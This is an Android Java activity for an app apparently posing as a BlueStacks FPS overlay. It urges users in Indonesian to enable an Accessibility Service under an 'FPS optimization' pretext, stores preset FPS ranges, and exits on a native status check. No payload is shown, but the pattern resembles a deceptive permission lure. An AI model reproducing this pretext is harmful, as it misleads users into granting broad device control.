package com.bluestacks.fpsoverlay;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.app.AlertDialog;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.Switch;
import android.widget.Button;
import android.widget.Toast;

public class CoreActivity extends Activity {

    private AlertDialog currentDialog;

    public native boolean checkStatus();

    static {
        System.loadLibrary("fps-native");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        if (checkStatus()) {
            finish();
            return;
        }

        initializeUI();
    }

    private void initializeUI() {
        final SharedPreferences sharedPreferences = getSharedPreferences("status_fps", 0);
        final Switch swShow = findViewById(R.id.sw_show);
        final EditText etMin = findViewById(R.id.et_min);
        final EditText etMax = findViewById(R.id.et_max);
        final Button btnApply = findViewById(R.id.btn_apply);

        String minVal = sharedPreferences.getString("min", "97");
        String maxVal = sharedPreferences.getString("max", "114");
        etMin.setText(minVal);
        etMax.setText(maxVal);

        boolean isShowing = sharedPreferences.getBoolean("is_showing", false);
        swShow.setChecked(isShowing);

        swShow.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (isChecked && !isServiceEnabled()) {
                swShow.setChecked(false);
                showModernAccessibilityDialog();
            } else {
                sharedPreferences.edit().putBoolean("is_showing", isChecked).apply();
                updateServiceState(isChecked);
            }
        });

        btnApply.setOnClickListener(v -> {
            String min = etMin.getText().toString();
            String max = etMax.getText().toString();
            if (!min.isEmpty() && !max.isEmpty()) {
                sharedPreferences.edit()
                    .putString("min", min)
                    .putString("max", max)
                    .apply();
                Toast.makeText(this, "Settings Applied", Toast.LENGTH_SHORT).show();
                if (swShow.isChecked()) {
                    updateServiceState(true);
                }
            }
        });
    }

    private void updateServiceState(boolean isShowing) {
        Intent intent = new Intent(this, FpsService.class);
        if (isShowing) {
            startService(intent);
        } else {
            stopService(intent);
        }
    }

    private void showModernAccessibilityDialog() {
        if (currentDialog != null && currentDialog.isShowing()) return;

        currentDialog = new AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Light_Dialog_Alert)
            .setTitle("FPS Realtime Optimization")
            .setMessage("Aktifkan 'Accessibility Service' untuk mengizinkan aplikasi melakukan optimasi FPS secara realtime.\n\nDengan fitur ini, Anda dapat melihat FPS asli perangkat saat bermain game, bukan angka statis.")
            .setCancelable(false)
            .setPositiveButton("AKTIFKAN SEKARANG", (dialog, which) -> {
                Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
            })
            .setNegativeButton("NANTI", (dialog, which) -> dialog.dismiss())
            .show();
    }

    private boolean isServiceEnabled() {
        String s_id = getPackageName() + "/" + SupportService.class.getName();
        String active = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (active == null) return false;
        TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
        splitter.setString(active);
        while (splitter.hasNext()) {
            if (splitter.next().equalsIgnoreCase(s_id)) return true;
        }
        return false;
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (isServiceEnabled()) {
            SharedPreferences sharedPreferences = getSharedPreferences("status_fps", 0);
            if (sharedPreferences.getBoolean("is_showing", false)) {
                Switch swShow = findViewById(R.id.sw_show);
                swShow.setChecked(true);
                updateServiceState(true);
            }
        }
    }
}
